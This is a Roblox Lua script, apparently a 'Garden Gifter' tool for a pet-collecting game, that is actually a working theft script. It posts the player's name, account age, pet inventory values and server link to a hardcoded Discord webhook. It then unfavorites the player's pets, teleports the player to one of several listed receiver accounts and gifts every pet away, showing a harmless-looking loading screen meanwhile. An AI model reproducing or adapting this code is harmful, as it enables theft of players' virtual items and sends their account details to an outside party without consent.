-- Webhook URL
local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

-- Services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Configuration
local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5 -- seconds between receiver checks
local SHUTDOWN_DURATION = 10 -- seconds to show shutdown screen
local GIFT_COOLDOWN = 3 -- seconds between gifts
local CHAT_KEYWORD = "a" -- Keyword to look for in chat
local MINIMUM_PETS = 3 -- Minimum pets required to proceed
local MINIMUM_TOTAL_VALUE = 50000 -- Minimum total pet value (in cents)

-- Enable HTTP if needed
if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

-- Enhanced Webhook Function
local function sendWebhook(data)
    if not data or (not data.content and not data.embeds) then
        warn("Webhook data is empty or invalid")
        return false
    end

    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Garden Gifter",
        avatar_url = "https://i.imgur.com/6JqX9yP.png"
    }

    local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
    if not json then
        warn("Failed to encode webhook data:", encodeError)
        return false
    end

    local requestMethods = {
        syn and syn.request,
        http_request,
        request,
        fluxus and fluxus.request,
        http and http.request
    }

    for _, reqFunc in ipairs(requestMethods) do
        if type(reqFunc) == "function" then
            local success, response = pcall(function()
                return reqFunc({
                    Url = Webhook1,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Roblox"
                    },
                    Body = json
                })
            end)

            if success and response then
                if response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
                    return true
                end
            end
        end
    end
    return false
end

-- Get all pets in inventory with proper detection
local function getPetsInventory()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial
            })
        end
    end
    return pets
end

-- Calculate pet value
local function calculatePetValue(kg, age)
    return math.floor((kg * 10000) + (age * 1000))
end

-- Send initial inventory report
local function sendInitialReport()
    local pets = getPetsInventory()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local serverUrl = "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId

    -- Calculate total value and build pet list
    local totalValue = 0
    local petList = ""
    local specialCount = 0
    
    for _, pet in ipairs(pets) do
        local value = calculatePetValue(pet.kg, pet.age)
        totalValue = totalValue + value
        petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %d¢\n",
            pet.special and "🌟" or "🐶",
            pet.name,
            pet.kg,
            pet.age,
            value
        )
        if pet.special then specialCount = specialCount + 1 end
    end

    local embed = {
        title = "🌿 Garden Gifter - Initial Report",
        description = string.format([[
**Player:** %s (@%s)
**Account Age:** %d days
**Server:** [Join Game](%s)

**Pet Inventory (%d)**
%s
**Total Value:** %d¢
**Special Pets:** %d
]], 
            LocalPlayer.Name,
            LocalPlayer.DisplayName,
            LocalPlayer.AccountAge,
            serverUrl,
            #pets,
            petList,
            totalValue,
            specialCount
        ),
        color = 65280,
        footer = {
            text = "Watching for: "..table.concat(RECEIVERS, ", ")
        },
        timestamp = DateTime.now():ToIsoDate()
    }

    return sendWebhook({
        content = specialCount > 0 and "@everyone" or nil,
        embeds = {embed}
    })
end

-- Loading GUI
local function createLoader()
    local loaderGui = Instance.new("ScreenGui")
    loaderGui.Name = "GardenLoader"
    loaderGui.IgnoreGuiInset = true
    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loaderGui.DisplayOrder = 999999

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 150)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = loaderGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "Garden Gifter"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.BackgroundTransparency = 1
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 10)
    titleLabel.Parent = mainFrame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Text = "Initializing..."
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusLabel.TextSize = 14
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.BackgroundTransparency = 1
    statusLabel.Size = UDim2.new(1, 0, 0, 20)
    statusLabel.Position = UDim2.new(0, 0, 0, 120)
    statusLabel.Parent = mainFrame

    loaderGui.Parent = CoreGui
    return statusLabel
end

-- Check if pet is favorited
local function isPetFavorited(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    return pet and pet:GetAttribute("Favorited")
end

-- Unfavorite a pet
local function unfavoritePet(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
        return true
    end
    return false
end

-- Gift pet using remote
local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

-- Equip a single pet
local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    -- Unequip current pets
    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    -- Equip new pet
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        pet.Parent = character
        return true
    end
    return false
end

-- Teleport to target player
local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

-- Check if any receiver is in the game
local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

-- Wait for a receiver to join or say the keyword
local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")

    -- Check existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
            break
        end
    end

    -- Listen for new players
    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
        end
    end)

    -- Backup periodic checking
    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    return foundReceiver
end

-- Main gifting loop
local function startGifting(targetPlayer)
    while true do
        local pets = getPetsInventory()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if isPetFavorited(pet.fullName) then
                unfavoritePet(pet.fullName)
                task.wait(1)
            end

            if equipSinglePet(pet.fullName) then
                giftPet(targetPlayer, pet.fullName)
                task.wait(GIFT_COOLDOWN)
                break
            end
        end
        task.wait(1)
    end
end

-- Main Execution
local statusLabel = createLoader()

-- Send initial report immediately
statusLabel.Text = "Sending inventory report..."
local reportSuccess = sendInitialReport()
if not reportSuccess then
    statusLabel.Text = "Failed to send report"
    task.wait(3)
    return
end

statusLabel.Text = "Waiting for receiver..."
local receiver = waitForReceiver()
if not receiver then
    statusLabel.Text = "No receiver found"
    task.wait(3)
    return
end

statusLabel.Text = "Starting gifting process..."
teleportToPlayer(receiver)
startGifting(receiver)
